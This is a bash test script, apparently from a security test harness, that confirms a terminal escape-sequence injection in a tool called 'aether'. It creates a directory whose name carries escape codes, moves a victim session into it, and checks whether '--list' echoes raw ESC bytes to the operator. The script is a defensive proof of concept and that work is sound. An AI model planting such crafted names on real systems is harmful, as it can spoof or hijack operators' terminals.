#!/usr/bin/env bash
# Terminal escape-sequence injection via untrusted process metadata that the
# chooser / `aether --list` render to the operator's terminal unsanitized.
set -u
. /harness/lib.sh

hr "T04: terminal escape injection via session metadata (WorkDir)"
start_daemon || exit 1

# Attacker-plantable content: a directory whose NAME contains terminal control
# sequences (a malicious tarball/git repo/downloaded folder). cd via a GLOB so
# the escape bytes never have to transit the keyboard/PTY path.
EVILDIR=$(printf '/tmp/\033]2;PWNED-WINDOW-TITLE\033\\\033[31mEVILZZZ')
runuser -u victim -- mkdir -p "$EVILDIR" 2>/dev/null
echo "created evil dir; raw name (cat -v):"
runuser -u victim -- sh -c 'ls -1d /tmp/*EVILZZZ | cat -v'

# Put a session's foreground process INTO that directory using a glob match.
as_victim python3 /harness/drive.py "$VICTIM_SOCK" $'cd /tmp/*EVILZZZ 2>/dev/null; exec sleep 1000\n' &
sleep 1.5

echo
echo "-- foreground cwd the daemon now reports for the session --"
as_victim python3 /harness/probe.py "$VICTIM_SOCK" '{"type":"list"}' > /tmp/list_json.out 2>/dev/null || true
echo "workdir field in the list JSON (cat -v):"
grep -ao '"workdir":"[^"]*"' /tmp/list_json.out | cat -v

echo
echo "-- capture raw bytes of 'aether --list' as the operator's terminal receives them --"
as_victim aether --list > /tmp/list.out 2>/dev/null || true
echo "cat -v:"
cat -v /tmp/list.out
echo
if grep -q $'\033' /tmp/list.out; then
    echo ">>> ESC (0x1b) bytes ARE present in --list output: terminal escape injection CONFIRMED"
    echo "    bytes:"; od -c /tmp/list.out | grep -A0 033 | head -3
else
    echo ">>> no ESC bytes in --list output"
fi

stop_daemon
runuser -u victim -- rm -rf /tmp/*EVILZZZ 2>/dev/null || true
